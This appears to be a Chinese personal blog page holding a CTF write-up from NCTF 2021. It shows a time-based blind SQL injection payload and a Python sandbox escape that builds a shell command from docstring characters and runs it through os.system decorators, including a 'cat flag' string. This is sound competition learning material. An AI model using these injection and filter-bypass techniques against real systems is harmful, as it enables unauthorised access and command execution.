@@ -1,0 +1,695 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="？？既然创建了那就写完这次比赛输出很惨烈，回去再练练吧 本来2人组了个摆烂队准备签个到，中途加进来了zsky师傅说一起摆，然后大佬出了4个re一血贡献了2000分，俺们两个加起来贡献了400分，俺作为web手输出了个签到呜呜呜 复盘(官方wp) 太废物了 webezsqlpayload: 1?username[0]&#x3D;exp&amp;username[1]&#x3D;sleep(if(((substr((se">
+<meta property="og:type" content="article">
+<meta property="og:title" content="NCTF,心态裂开">
+<meta property="og:url" content="http://example.com/2021/11/28/NCTF-%E5%BF%83%E6%80%81%E8%A3%82%E5%BC%80/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="？？既然创建了那就写完这次比赛输出很惨烈，回去再练练吧 本来2人组了个摆烂队准备签个到，中途加进来了zsky师傅说一起摆，然后大佬出了4个re一血贡献了2000分，俺们两个加起来贡献了400分，俺作为web手输出了个签到呜呜呜 复盘(官方wp) 太废物了 webezsqlpayload: 1?username[0]&#x3D;exp&amp;username[1]&#x3D;sleep(if(((substr((se">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2021-11-28T14:30:20.000Z">
+<meta property="article:modified_time" content="2024-03-06T05:12:33.133Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="赛事">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>NCTF,心态裂开 - Hexo</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Fluid</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>Links</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/background1.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="NCTF,心态裂开"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2021-11-28 22:30" pubdate>
+          November 28, 2021 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          973 words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          9 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">NCTF,心态裂开</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>？？既然创建了那就写完<br>这次比赛输出很惨烈，回去再练练吧</p>
+<p>本来2人组了个摆烂队准备签个到，中途加进来了zsky师傅说一起摆，然后大佬出了4个re一血贡献了2000分，俺们两个加起来贡献了400分，俺作为web手输出了个签到呜呜呜</p>
+<p>复盘<br>(<a target="_blank" rel="noopener" href="https://ctf.njupt.edu.cn/727.html">官方wp</a>)</p>
+<p>太废物了</p>
+<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="ezsql"><a href="#ezsql" class="headerlink" title="ezsql"></a>ezsql</h2><p>payload:</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">?username[<span class="hljs-number">0</span>]=<span class="hljs-keyword">exp</span>&amp;username[<span class="hljs-number">1</span>]=<span class="hljs-keyword">sleep</span>(<span class="hljs-keyword">if</span>(((<span class="hljs-keyword">substr</span>((<span class="hljs-keyword">select</span>(database())),<span class="hljs-number">11</span>,<span class="hljs-number">1</span>)=<span class="hljs-string">&quot;f&quot;</span>)),<span class="hljs-number">10</span>,<span class="hljs-number">0</span>))&amp;username[<span class="hljs-number">2</span>]=<span class="hljs-number">1</span><span class="hljs-keyword">substr</span>((<span class="hljs-keyword">select</span>(database())),<span class="hljs-number">11</span>,<span class="hljs-number">1</span>)=<span class="hljs-string">&quot;f&quot;</span><br></code></pre></td></tr></table></figure>
+<p>脚本:</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs"><br></code></pre></td></tr></table></figure>
+<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="Python沙盒绕过"><a href="#Python沙盒绕过" class="headerlink" title="Python沙盒绕过"></a>Python沙盒绕过</h2><p>关键在于学python，而8是学姿势，因为姿势太多了…..</p>
+<p>题目的话，是要给1个QQ_bot发送payload以获取flag，因为时隔已久，所以也没保存截图啥的</p>
+<p>有个附件，里面是代码，当时心态大崩所以连打开康康的勇气都没了…<br>事实上这个决定也没戳，看了大佬的wp后，这道题要想有个思路啥的至少得有150点Python精通，像什么__doc__之类的我一个写爬虫的屑辣鸡压根没听过….(虽然如此，但绕过的方法应该8止这一种)</p>
+<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>下载附件，是python代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64decode, b64encode<br><br>code = sys.argv[<span class="hljs-number">1</span>]  <span class="hljs-comment">#即给程序的第一个参数</span><br><span class="hljs-keyword">try</span>:<br>    data = b64decode(code.encode()).decode()   <span class="hljs-comment">#code.encode(): 把code转化为字节码; 然后base64解码，然后再返回去</span><br><span class="hljs-keyword">except</span>:      <span class="hljs-comment"># 若触发异常的解决方案</span><br>    exit(<span class="hljs-number">0</span>)   <span class="hljs-comment">#那就是退出辣</span><br><br><span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;h&quot;\&#x27;(&#x27;</span>:  <span class="hljs-comment"># 屏蔽一些字符   </span><br>    <span class="hljs-keyword">if</span> c <span class="hljs-keyword">in</span> data: exit(<span class="hljs-number">0</span>)<br><br><span class="hljs-built_in">exec</span>(data)  <span class="hljs-comment"># 执行命令(在python环境下)</span><br><br></code></pre></td></tr></table></figure>
+
+<p>思路: 写在理解后<br>首先，输入字符串，被base64解码，再被屏蔽掉 h “ ‘ \ ( 这些字符，然后进行exec</p>
+<p>那么就阔以通过利用差8多exec(“os.system(‘xxx’)”)的形式进行操作, 但是里面的单引号和xxx怎么绕过呢?<br>阔以通过先构造1个字符串a，然后以exec(“os.system(a)”)的形式操作。但是构造字符串还是需要单引号啊<br>这里就有8止一种绕过方法了，wp是通过__doc__来绕过单引号，暂时也想不出别的方法能绕过呜呜呜<br>怎么通过__doc__绕过呢? 阔以看后面的扫盲</p>
+<p>然后这个问题也就解决了，就阔以构造payload了<br>那么就又又问题了，屏蔽了括号，怎么绕过?</p>
+<p>然后看的wp里构造payload需要了解 函数装饰器，这个也咩听过,后来学的,在有关python的博客文章里做笔记了，这里就掠过</p>
+<p>然后，接下来应该由你自己实现构造了，骚年!!!</p>
+<p>可是….构造装饰函数时也需要用到括号啊…….莫非有什么👴8知道的姿势?</p>
+<p>payload: 比方我要输入命令ls:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br>a=&#123;&#125;.__doc__<br>cmd=a[<span class="hljs-number">69</span>] + a[<span class="hljs-number">97</span>] <span class="hljs-comment"># ls</span><br>x=<span class="hljs-keyword">lambda</span> _:cmd   <span class="hljs-comment">#匿名函数x返回结果为cmd, 即&#x27;ls&#x27;</span><br><span class="hljs-meta">@os.system     </span><span class="hljs-comment"># 第一层修饰</span><br><span class="hljs-meta">@x            </span><span class="hljs-comment"># 第二层修饰</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">_</span>: <span class="hljs-keyword">pass</span>  <span class="hljs-comment">#装饰器修饰的对象工具人，至于这里的class是什么意思....8知道了，网上没搜到，可能与类的声明有关(可这明明是函数啊)</span><br><span class="hljs-comment"># 就相当于:     先执行class=x(class),结果是增加了返回&#x27;ls&#x27;的语句， 然后是class=os.system(class)</span><br></code></pre></td></tr></table></figure>
+
+
+<h3 id="扫盲"><a href="#扫盲" class="headerlink" title="扫盲"></a>扫盲</h3><h4 id="doc"><a href="#doc" class="headerlink" title="doc"></a><strong>doc</strong></h4><p>是个说明文档，用来帮助py使用者们理解的功能，eg: 略</p>
+<p>他还有个功能就是这个:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">a=&#123;&#125;.__doc__<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(-<span class="hljs-number">350</span>,<span class="hljs-number">350</span>):<br>    <span class="hljs-built_in">print</span>(a[i])<br></code></pre></td></tr></table></figure>
+<p>结果(去掉换行符)是一句话: </p>
+<figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haxe">dictionarydict(mapping)-&gt;<span class="hljs-keyword">new</span><span class="hljs-type">dictionaryinitializedfromamappingobject</span>&#x27;s(key,value)pairsdict(iterable)-&gt;<span class="hljs-keyword">new</span><span class="hljs-type">dictionaryinitializedasifvia</span>:d=&#123;&#125;fork,viniterable:<span class="hljs-type">d</span>[k]=vdict(**kwargs)-&gt;<span class="hljs-keyword">new</span><span class="hljs-type">dictionaryinitializedwiththename</span>=valuepairsinthekeywordargumentlist.Forexample:<span class="hljs-type">dict</span>(one=<span class="hljs-number">1</span>,two=<span class="hljs-number">2</span>)dict()-&gt;<span class="hljs-keyword">new</span><span class="hljs-type">emptydictionarydict</span>(mapping)-&gt;<span class="hljs-keyword">new</span><span class="hljs-type">dictionaryinitializedfromamappingobject</span>&#x27;s(key,value)pairsdict(iterable)-&gt;<span class="hljs-keyword">new</span><span class="hljs-type">dictionaryinitializedasifvia</span>:d=&#123;&#125;fork,viniterable:<span class="hljs-type">d</span>[k]=vdict(**kwargs)-&gt;<span class="hljs-keyword">new</span><span class="hljs-type">dictionaryinitializedwiththename</span>=valuepairsinthekeywordargumentlist.Forexample:<span class="hljs-type"></span><br></code></pre></td></tr></table></figure>
+
+<p>这句话是啥意思8要紧，但是里面有26个英文字母，阔以帮助俺们绕过，eg: </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">a=&#123;&#125;.__doc__<br>a[-<span class="hljs-number">348</span>]+a[-<span class="hljs-number">343</span>]+a[<span class="hljs-number">334</span>]+a[<span class="hljs-number">336</span>]+a[<span class="hljs-number">75</span>]+a[<span class="hljs-number">69</span>]+a[-<span class="hljs-number">343</span>]+a[<span class="hljs-number">42</span>]  <span class="hljs-comment">#就是字符串&#x27;cat flag&#x27;</span><br></code></pre></td></tr></table></figure>
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/CTF/%E8%B5%9B%E4%BA%8B/" class="category-chain-item">赛事</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E8%B5%9B%E4%BA%8B/" class="print-no-link">#赛事</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>NCTF,心态裂开</div>
+      <div>http://example.com/2021/11/28/NCTF-心态裂开/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>John Doe</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>November 28, 2021</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/12/17/sql%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF%E7%9A%84%E6%80%BB%E7%BB%93/" title="sql注入姿势总结">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">sql注入姿势总结</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/11/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AC%94%E8%AE%B0/" title="数据结构笔记??">
+                        <span class="hidden-mobile">数据结构笔记??</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
